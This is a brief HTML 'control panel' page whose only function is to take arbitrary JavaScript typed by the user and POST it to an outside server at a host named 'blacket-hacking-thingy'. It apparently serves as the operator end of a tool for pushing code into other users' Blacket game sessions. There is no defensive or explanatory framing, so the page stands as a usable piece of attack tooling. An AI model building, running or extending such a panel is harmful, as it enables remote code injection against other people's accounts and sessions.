<!DOCTYPE html>
<html lang="en">
<head>
    <title>Blacket Control Panel</title>
</head>
<body>
    <h1>Send JavaScript</h1>
    <textarea id="jsCode" placeholder="Enter JS code..."></textarea>
    <button onclick="sendCode()">Send</button>

    <script>
        function sendCode() {
            let code = document.getElementById("jsCode").value;
            fetch("https://blacket-hacking-thingy.vercel.app/api/send", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ code })
            });
        }
    </script>
</body>
</html>
